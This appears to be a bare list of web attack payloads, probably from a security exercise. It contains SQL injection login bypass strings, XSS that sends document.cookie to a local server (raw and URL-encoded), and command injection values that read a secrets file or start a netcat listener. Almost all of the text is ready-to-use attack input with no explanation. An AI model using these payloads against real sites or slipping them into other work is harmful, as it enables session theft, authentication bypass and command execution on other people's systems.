alice@alice.com' or 'X'='X
admin@a.com' or 'x' ='x'


<script>alert("You are doomed")</script>

<script>alert(document.cookie)</script>

post.php?news=<script>alert(document.cookie)</script>



XSS:

Second Order
<script>

var image = new Image();
image.src = "http://0.0.0.0:5000/news?text=".concat(document.cookie);

</script>


First Order

http://0.0.0.0:5000/search?term=%3Cscript%3E++var+image+%3D+new+Image%28%29%3B+image.src+%3D+%22http%3A%2F%2F0.0.0.0%3A5000%3Anews%3Ftext%3D%22.concat%28document.cookie%29%3B++%3C%2Fscript%3E


google.com; cat secrets

google.com; nc -l -p 8080 -vvv